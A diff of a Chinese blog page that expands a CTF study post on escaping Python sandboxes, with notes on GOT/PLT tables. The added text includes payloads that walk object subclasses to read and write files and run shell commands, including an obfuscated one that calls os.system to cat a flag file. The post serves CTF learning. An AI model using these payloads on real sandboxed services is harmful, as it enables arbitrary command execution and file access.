@@ -100,7 +100,7 @@
 <meta property="og:url" content="http://Merl1ng.com/2018/08/16/python沙盒逃逸/index.html">
 <meta property="og:site_name" content="Merl1ng's blog">
 <meta property="og:description" content="tjctf上遇到了好几道py沙盒逃逸的题目">
-<meta property="og:updated_time" content="2018-08-17T06:25:02.548Z">
+<meta property="og:updated_time" content="2018-08-18T08:12:50.853Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="python沙盒逃逸">
 <meta name="twitter:description" content="tjctf上遇到了好几道py沙盒逃逸的题目">
@@ -331,11 +331,27 @@
 
       
         <p>tjctf上遇到了好几道py沙盒逃逸的题目<br><a id="more"></a></p>
-<p>参考<br><a href="https://blog.csdn.net/qq_35078631/article/details/78504415" target="_blank" rel="external">https://blog.csdn.net/qq_35078631/article/details/78504415</a><br><a href="https://bestwing.me/awesome-python-sandbox-in-ciscn.html" target="_blank" rel="external">https://bestwing.me/awesome-python-sandbox-in-ciscn.html</a><br><a href="https://xz.aliyun.com/t/52#toc-5" target="_blank" rel="external">https://xz.aliyun.com/t/52#toc-5</a><br><a href="https://www.anquanke.com/post/id/85571" target="_blank" rel="external">https://www.anquanke.com/post/id/85571</a><br><a href="https://blog.csdn.net/wy_97/article/details/80393854" target="_blank" rel="external">https://blog.csdn.net/wy_97/article/details/80393854</a></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/qq_35078631/article/details/78504415" target="_blank" rel="external">https://blog.csdn.net/qq_35078631/article/details/78504415</a><br><a href="https://bestwing.me/awesome-python-sandbox-in-ciscn.html" target="_blank" rel="external">https://bestwing.me/awesome-python-sandbox-in-ciscn.html</a><br><a href="https://xz.aliyun.com/t/52#toc-5" target="_blank" rel="external">https://xz.aliyun.com/t/52#toc-5</a><br><a href="https://www.anquanke.com/post/id/85571" target="_blank" rel="external">https://www.anquanke.com/post/id/85571</a><br><a href="https://blog.csdn.net/wy_97/article/details/80393854" target="_blank" rel="external">https://blog.csdn.net/wy_97/article/details/80393854</a></p>
 <p>这几篇文章都挺好的 读了好几遍</p>
-<p>在python中 不用引入直接使用的内置函数称为 builtin 函数,随着<strong>builtin</strong>这一个module 自动被引入到环境中</p>
+<h3 id="内敛函数"><a href="#内敛函数" class="headerlink" title="内敛函数"></a>内敛函数</h3><p>在python中 不用引入直接使用的内置函数称为 builtin 函数,随着<strong>builtin</strong>这一个module 自动被引入到环境中</p>
 <p>而它十分强大 可以 dir(‘builtins’) 查看</p>
-<p>然后。然后我懒得写了 看那几篇文章就行 等下次遇到题我再写XD</p>
+<p>如果一些 内敛函数在builtins删除 ，我们可以通过<code>reload(__builtins__)</code>重新载入获取一个完整的builtins</p>
+<h3 id="创建对象，以及引用"><a href="#创建对象，以及引用" class="headerlink" title="创建对象，以及引用"></a>创建对象，以及引用</h3><p>有常见的两个方法</p>
+<p><code>().__class__.__bases__[0]</code><br><code>&#39;&#39;.__class__.__mro__[2]</code></p>
+<h3 id="常见payload"><a href="#常见payload" class="headerlink" title="常见payload"></a>常见payload</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#读文件</span></div><div class="line">().__class__.__bases__[0].__subclasses__()[40](r<span class="string">'C:\1.php'</span>).read()</div><div class="line"></div><div class="line"><span class="comment">#写文件</span></div><div class="line">().__class__.__bases__[0].__subclasses__()[40](<span class="string">'/var/www/html/input'</span>, <span class="string">'w'</span>).write(<span class="string">'123'</span>)</div><div class="line"></div><div class="line"><span class="comment">#执行任意命令</span></div><div class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("ls  /var/www/html").read()'</span> )</div></pre></td></tr></table></figure>
+<h3 id="dict-和-getattribute"><a href="#dict-和-getattribute" class="headerlink" title="__dict__和 __getattribute__"></a><code>__dict__</code>和 <code>__getattribute__</code></h3><p>一个模块对象有一个由字典对象实现的命名空间…属性引用被转换为这个字典中的查找，例如，m.x等同于m.dict[“x”]</p>
+<p>进而，我们可以通过<code>__dict__</code>引入我们想要引入的模块</p>
+<p><code>__getattribute__</code>是访问属性的方法</p>
+<p>比如某个比赛的payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">x = [x <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'ca'</span>+<span class="string">'tch_warnings'</span>][0].__init__</div><div class="line">x.__getattribute__(<span class="string">"func_global"</span>+<span class="string">"s"</span>)[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'l'</span>+<span class="string">'s'</span>)</div><div class="line">x.__getattribute__(<span class="string">"func_global"</span>+<span class="string">"s"</span>)[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'l'</span>+<span class="string">'s /home/ctf'</span>)</div><div class="line">x.__getattribute__(<span class="string">"func_global"</span>+<span class="string">"s"</span>)[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'ca'</span>+<span class="string">'t /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb'</span>)</div></pre></td></tr></table></figure>
+<p>其中 linecache 模块的作用是将文件内容读取到内存中</p>
+<p>这题还能用pwn中改got表的方法做 不过暂时看不懂orz</p>
+<p>稍微了解下got表<br><a href="https://blog.csdn.net/qq_18661257/article/details/54694748" target="_blank" rel="external">https://blog.csdn.net/qq_18661257/article/details/54694748</a></p>
+<h3 id="补充-GOT表和PLT表"><a href="#补充-GOT表和PLT表" class="headerlink" title="补充:GOT表和PLT表"></a>补充:GOT表和PLT表</h3><p>为了更好的用户体验和内存CPU的利用率，程序编译时会采用两种表进行辅助，一个为PLT表，一个为GOT表，PLT表可以称为内部函数表，GOT表为全局函数表（也可以说是动态函数表这是个人自称），这两个表是相对应的，什么叫做相对应呢，PLT表中的数据就是GOT表中的一个地址，可以理解为一定是一一对应的</p>
+<p>PLT表中的每一项的数据内容都是对应的GOT表中一项的地址这个是固定不变的，PLT表中的数据根本不是函数的真实地址，而是GOT表项的地址</p>
+<p>其实在进入带有@plt标志的函数时，这个函数其实就是个过渡作用，因为GOT表项中的数据才是函数最终的地址，而PLT表中的数据又是GOT表项的地址，我们就可以通过PLT表跳转到GOT表来得到函数真正的地址。</p>
+<p>那问题来了，这个@plt函数时怎么来的，这个函数是编译系统自己加的</p>
+<p>可以通过disas gets看看里面的代码</p>
 
       
     </div>
@@ -432,8 +448,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel sidebar-panel-active">
+      <section class="site-overview sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/images/avatar.gif"
@@ -448,7 +473,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives/">
-                <span class="site-state-item-count">65</span>
+                <span class="site-state-item-count">66</span>
                 <span class="site-state-item-name">posts</span>
               </a>
             </div>
@@ -515,6 +540,22 @@
 
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#参考"><span class="nav-number">1.</span> <span class="nav-text">参考</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#内敛函数"><span class="nav-number">2.</span> <span class="nav-text">内敛函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#创建对象，以及引用"><span class="nav-number">3.</span> <span class="nav-text">创建对象，以及引用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常见payload"><span class="nav-number">4.</span> <span class="nav-text">常见payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dict-和-getattribute"><span class="nav-number">5.</span> <span class="nav-text">__dict__和 __getattribute__</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#补充-GOT表和PLT表"><span class="nav-number">6.</span> <span class="nav-text">补充:GOT表和PLT表</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
